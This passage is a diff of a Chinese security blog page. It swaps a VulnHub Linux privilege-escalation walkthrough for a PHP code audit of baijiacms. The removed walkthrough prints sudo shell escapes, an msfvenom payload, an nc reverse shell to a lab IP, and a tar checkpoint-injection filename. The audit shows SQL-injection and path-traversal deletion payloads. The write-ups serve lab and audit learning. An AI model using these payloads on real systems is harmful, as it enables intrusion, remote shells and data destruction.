@@ -6,53 +6,44 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://example.com">
-  <title>Liunx提权靶场一游 | Solkatt的小窝</title>
+  <title>php代码审计之baijiacms | Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="靶机地址与安装1234567891011121314#下载链接https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;linsecurity-1,244&#x2F;用户名密码：bob&#x2F;secret#安装与配置1.修改默认键盘布局[默认不是美式键盘]sudo awk &amp;#x27;BEGIN &amp;#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&amp;#125;&amp;#x27;[修改前\&quot;符号">
+  <meta name="description" content="项目结构通过对代码的一个大致结构分析，知道了它的主要功能都是在system目录下。 system目录下有class和template文件，template代表是前端，class是后端处理文件。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Liunx提权靶场一游">
-<meta property="og:url" content="https://example.com/2022/03/25/Liunx%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%B8/index.html">
+<meta property="og:title" content="php代码审计之baijiacms">
+<meta property="og:url" content="https://example.com/2022/08/18/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bbaijiacms/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
-<meta property="og:description" content="靶机地址与安装1234567891011121314#下载链接https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;linsecurity-1,244&#x2F;用户名密码：bob&#x2F;secret#安装与配置1.修改默认键盘布局[默认不是美式键盘]sudo awk &amp;#x27;BEGIN &amp;#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&amp;#125;&amp;#x27;[修改前\&quot;符号">
+<meta property="og:description" content="项目结构通过对代码的一个大致结构分析，知道了它的主要功能都是在system目录下。 system目录下有class和template文件，template代表是前端，class是后端处理文件。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325104232243.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325105414439.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325105749744.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325105839939.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325110314338.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325111759093.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325111911455.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325111015896.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325113416094.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325113621004.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325113743063.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325115808687.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325115851286.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325161742759.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325162035632.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325162858779.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325162945722.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325163139641.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325163502734.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325163523182.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325164716494.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325164813507.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325170408111.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325171318385.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325171521879.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325172400774.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325190543341.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325190947875.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325191943553.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325192434111.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325193614818.png">
-<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325194131842.png">
-<meta property="article:published_time" content="2022-03-25T02:41:29.000Z">
-<meta property="article:modified_time" content="2022-08-16T07:31:44.529Z">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818155045342.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818155609848.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818162558347.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818162527627.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818163745175.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818164529021.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818165510899.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818165734351.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818170202137.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818172910073.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818173028505.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818170821451.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818173403709.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818174034952.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818175041589.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818175308892.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818175346691.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818175451144.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818175622737.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818180617409.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818180732121.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818181041898.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818181955379.png">
+<meta property="article:published_time" content="2022-08-18T07:43:17.000Z">
+<meta property="article:modified_time" content="2022-08-18T10:25:09.733Z">
 <meta property="article:author" content="Solkatt">
-<meta property="article:tag" content="靶机渗透">
+<meta property="article:tag" content="php代码审计">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325104232243.png">
+<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818155045342.png">
   
     <link rel="alternative" href="/atom.xml" title="Solkatt的小窝" type="application/atom+xml">
   
@@ -180,165 +171,109 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Liunx提权靶场一游" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-php代码审计之baijiacms" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Liunx提权靶场一游
+      php代码审计之baijiacms
     </h1>
   
 
         
-        <a href="/2022/03/25/Liunx%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%B8%B8/" class="archive-article-date">
-  	<time datetime="2022-03-25T02:41:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-25</time>
+        <a href="/2022/08/18/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bbaijiacms/" class="archive-article-date">
+  	<time datetime="2022-08-18T07:43:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-08-18</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="靶机地址与安装"><a href="#靶机地址与安装" class="headerlink" title="靶机地址与安装"></a>靶机地址与安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#下载链接</span><br><span class="line">https://www.vulnhub.com/entry/linsecurity-1,244/</span><br><span class="line">用户名密码：bob/secret</span><br><span class="line">#安装与配置</span><br><span class="line">1.修改默认键盘布局[默认不是美式键盘]</span><br><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br><span class="line">[修改前\&quot;符号是shift+2]</span><br><span class="line">vim /etc/default/keyboard</span><br><span class="line">[讲XKBLAYOUT改的值为us]</span><br><span class="line">setupcon</span><br><span class="line">2.配置网卡[Ubuntu 18通过netplan设置网络]</span><br><span class="line">vim /etc/netplan/50-cloud-init.yaml</span><br><span class="line">[将enp0s3改为ens33]</span><br><span class="line">netplan apply</span><br></pre></td></tr></table></figure>
+        <h1 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h1><p>通过对代码的一个大致结构分析，知道了它的主要功能都是在system目录下。</p>
+<p>system目录下有class和template文件，template代表是前端，class是后端处理文件。</p>
+<span id="more"></span>
 
-<p>网卡配置的时候记得把ens33往前面移动一点点</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325104232243.png" alt="image-20220325104232243"></p>
-<h2 id="Sudo提权"><a href="#Sudo提权" class="headerlink" title="Sudo提权"></a>Sudo提权</h2><p>Sudo权限本意是root把本来只能超级用户执行的命令赋予普通用户执行。</p>
-<p>Sudo提权其实是因为管理员平时为了方便，给/etc/sudoers文件配hi不当，从而导致了权限提升的问题。</p>
-<p>当你自己是一个普通用户的时候，可以通过命令<code>sudo-l</code>来查看自己可以执行哪些sudo命令</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325105414439.png" alt="image-20220325105414439"></p>
-<p>可以发现这里，我们有多种命令都被赋予了sudo权限。</p>
-<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/ash/#sudo">ash | GTFOBins</a>这个网站可以让我们查阅通过sudo权限如何调用命令获得root权限。比如我们查阅ash</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325105749744.png" alt="image-20220325105749744"></p>
-<p>在靶机中键入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ash</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818155045342.png" alt="image-20220818155045342"></p>
+<p>同时也可以搞清楚路由的生成规律：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8097/index.php?mod=site&amp;act=manager&amp;do=store&amp;op=display&amp;beid=1</span><br></pre></td></tr></table></figure>
 
-<p>即可成功提权</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325105839939.png" alt="image-20220325105839939"></p>
-<h2 id="etc-passwd哈希"><a href="#etc-passwd哈希" class="headerlink" title="etc/passwd哈希"></a>etc/passwd哈希</h2><p>liunx的用户密码哈希存储在/etc/shadow文件，普通用户能够看到的是/etc/passwd这个文件。在/etc/passwd中，我们会发现如下形式。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325110314338.png" alt="image-20220325110314338"></p>
-<p>比如<code>root:x:0:0:root:/root:/bin/bash</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.用户名</span><br><span class="line">2.密码，x表示密码保存在/etc/shadow</span><br><span class="line">3.UID，0代表root</span><br><span class="line">4.GID，表示所在组</span><br><span class="line">5.描述信息，依次为Full Name、Room Number、Work Phone、Home Phone和Other</span><br><span class="line">6.用户主目录</span><br><span class="line">7.默认shell类型</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818155609848.png" alt="image-20220818155609848"></p>
+<p>这里的act参数代表system文件夹下某个功能点，do代表功能点下具体的PHP文件，op则代表文件走哪个分支。</p>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>在<code>store.php</code>中有这么一段话。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$operation</span>==<span class="string">&#x27;display&#x27;</span>)</span><br><span class="line">       &#123;</span><br><span class="line">       	           <span class="variable">$pindex</span> = max(<span class="number">1</span>, intval(<span class="variable">$_GP</span>[<span class="string">&#x27;page&#x27;</span>]));</span><br><span class="line">           <span class="variable">$psize</span> = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">           	</span><br><span class="line">           	 <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GP</span>[<span class="string">&#x27;sname&#x27;</span>])) &#123;</span><br><span class="line">               <span class="variable">$selectCondition</span> .= <span class="string">&quot; AND store.sname  LIKE &#x27;%<span class="subst">&#123;$_GP[&#x27;sname&#x27;]&#125;</span>%&#x27;&quot;</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br></pre></td></tr></table></figure>
 
-<p>账户的第二列是密码hash，如果该列为x则代表密码哈希存储在/etc/shadow文件上。</p>
-<p>这里我们发现账户insecurity是超级账户（uid，gid为0）并且密码存储在了passwd文件上，借此可以拷贝下来解密</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325111759093.png" alt="image-20220325111759093"></p>
-<p>切换用户即可提权成功。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325111911455.png" alt="image-20220325111911455"></p>
-<h2 id="etc-shadow哈希"><a href="#etc-shadow哈希" class="headerlink" title="etc/shadow哈希"></a>etc/shadow哈希</h2><p>而/etc/shadow默认只能是root用户权限才能查看。它保存的是加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号<code>:</code>分为9个部分</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325111015896.png" alt="image-20220325111015896"></p>
-<p>为什么我们这里能以bob权限看到shadow呢，因为在刚才的sudo提取中，我们看到man命令也是赋予了sudo权限的，所以可以借此看到shadow文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.用户名</span><br><span class="line">2.加密后的密码</span><br><span class="line">3.上次修改密码的时间(从1970.1.1开始的总天数)</span><br><span class="line">4.两次修改密码间隔的最少天数，如果为0，则没有限制</span><br><span class="line">5.两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为99999则没有限制</span><br><span class="line">6.提前多少天警告用户密码将过期</span><br><span class="line">7.在密码过期之后多少天禁用此用户</span><br><span class="line">8.用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用</span><br><span class="line">9.保留</span><br><span class="line">#由示例可知，加密的密码具有固定格式：</span><br><span class="line">$id$salt$encrypted</span><br><span class="line">id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512</span><br><span class="line">salt为盐值,系统随机生成</span><br><span class="line">encrypted表示密码的hash值</span><br></pre></td></tr></table></figure>
+<p>该功能对应为店铺查询处。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818162558347.png" alt="image-20220818162558347"></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818162527627.png" alt="image-20220818162527627"></p>
+<p>追溯源头发现$_GP</p>
+<p>只是将get，post中的数据进行了一个数组合并，却没有做任何过滤。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GP</span> = <span class="variable">$_CMS</span> =  <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$_GP</span> = array_merge(<span class="variable">$_GET</span>, <span class="variable">$_POST</span>, <span class="variable">$_GP</span>);</span><br></pre></td></tr></table></figure>
 
-<p>由此也可以通过解密hash值，来得到密码。</p>
-<h2 id="crontab定时任务"><a href="#crontab定时任务" class="headerlink" title="crontab定时任务"></a>crontab定时任务</h2><p>corntab文件格式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* * * * * command</span><br><span class="line">分 时 日 月 周 命令</span><br><span class="line">第1列表示分钟1～59 每分钟用*或者 */1表示</span><br><span class="line">第2列表示小时1～23（0表示0点）</span><br><span class="line">第3列表示日期1～31</span><br><span class="line">第4列表示月份1～12</span><br><span class="line">第5列标识号星期0～6（0表示星期天）</span><br><span class="line">第6列要运行的命令</span><br></pre></td></tr></table></figure>
+<p>sql语句代入为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT store.* FROM  table(&#x27;system_store&#x27;) store where store.`deleted`=0  and store.sname like &#x27;%123&#x27; limit 0,20&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325113416094.png" alt="image-20220325113416094"></p>
-<p>查看<code>corn.daily</code>权限</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325113621004.png" alt="image-20220325113621004"></p>
-<p>发现这个定时任务的执行权限是root。接下来查看其内容</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220325113743063.png" alt="image-20220325113743063"></p>
-<p>知道它是把用户/home目录下的文件使用<code>tar</code>打包备份到<code>/etc/backups</code>下。</p>
-<p>这里涉及到了利用通配符使用tar进行命令注入。</p>
-<p>先在我们自己的kali机器上生成一个nc的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.137.133 lport=4444</span><br></pre></td></tr></table></figure>
+<p>直接将我们的数据带入数据库，由此可以判断这里存在sql注入漏洞。</p>
+<p>构造payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sname=<span class="number">123</span>%<span class="string">&#x27; and sleep(5) #</span></span><br></pre></td></tr></table></figure>
 
-<p>在受害机器上的bob目录下，注入一个标志来指定我们的检查点.</p>
-<p><code>--checkpoint是指每写入n个记录之后设置一个检查点，在检查点可以执行任意的操作。</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">–checkpoint-action=ACTION 在每个checkpoint（检查点）上执行ACTION</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818163745175.png" alt="image-20220818163745175"></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818164529021.png" alt="image-20220818164529021"></p>
+<p>sqlmap也验证成功。</p>
+<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>在database.php下有一个delete分支。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">				 <span class="keyword">if</span>(<span class="variable">$operation</span>==<span class="string">&#x27;delete&#x27;</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> 		<span class="variable">$d</span> = base64_decode(<span class="variable">$_GP</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"> 			<span class="variable">$path</span> = WEB_ROOT . <span class="string">&#x27;/config/data_backup/&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(is_dir(<span class="variable">$path</span> . <span class="variable">$d</span>)) &#123;</span><br><span class="line">			rmdirs(<span class="variable">$path</span> . <span class="variable">$d</span>);</span><br><span class="line">			message(<span class="string">&#x27;备份删除成功！&#x27;</span>, create_url(<span class="string">&#x27;site&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;act&#x27;</span> =&gt; <span class="string">&#x27;manager&#x27;</span>,<span class="string">&#x27;do&#x27;</span> =&gt; <span class="string">&#x27;database&#x27;</span>,<span class="string">&#x27;op&#x27;</span>=&gt;<span class="string">&#x27;restore&#x27;</span>)),<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>将payload写入一个sh文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;mkfifo /tmp/vtqm; nc 192.168.137.133 4444 0&lt;/tmp/vtqm | /bin/sh &gt;/tmp/vtqm 2&gt;&amp;1; rm /tmp/vtqm&quot; &gt; shell.sh</span><br></pre></td></tr></table></figure>
+<p>由上面的代码可以知道，$_GP[‘id’]函数接收前端的文件名参数后，仅仅只是把文件名base64解密了一下，就直接拼接到删除文件路径下了，没有做任何的过滤限制操作，造成了任意文件删除漏洞。</p>
+<p>同时看代码目录可以发现，每次备份数据库后，都会在conifg/data_backup数据库下生成一个随机文件夹。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818165510899.png" alt="image-20220818165510899"></p>
+<p>但是删除代码因为要判断必须是目录，所以只能删除目录及其目录下的文件。</p>
+<p>先去代码目录下去新建一个test文件夹。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818165734351.png" alt="image-20220818165734351"></p>
+<p>构造payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?mod=site&amp;act=manager&amp;do=database&amp;op=delete&amp;id=Li4vdGVzdA==&amp;beid=1</span><br><span class="line">ps：Li4vLi4vdGVzdA==为../../test</span><br></pre></td></tr></table></figure>
 
-<p>注入一个指定检查点动作的标志</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220818170202137.png" alt="image-20220818170202137"></p>
+<p>同时源码目录也没有test文件夹。</p>
+<h2 id="任意文件删除2"><a href="#任意文件删除2" class="headerlink" title="任意文件删除2"></a>任意文件删除2</h2><p>common.inc.php文件中，还有一个<code>file_delete</code>函数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_delete</span>(<span class="params"><span class="variable">$file_relative_path</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file_relative_path</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$settings</span>=globaSystemSetting();</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$settings</span>[<span class="string">&#x27;system_isnetattach&#x27;</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="variable">$settings</span>[<span class="string">&#x27;system_isnetattach&#x27;</span>]==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">require_once</span>(WEB_ROOT.<span class="string">&#x27;/includes/lib/lib_ftp.php&#x27;</span>);</span><br><span class="line">			<span class="variable">$ftp</span>=<span class="keyword">new</span> baijiacms_ftp();</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$ftp</span>-&gt;connect()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$ftp</span>-&gt;ftp_delete(<span class="variable">$settings</span>[<span class="string">&#x27;system_ftp_ftproot&#x27;</span>]. <span class="variable">$file_relative_path</span>)) &#123;</span><br><span 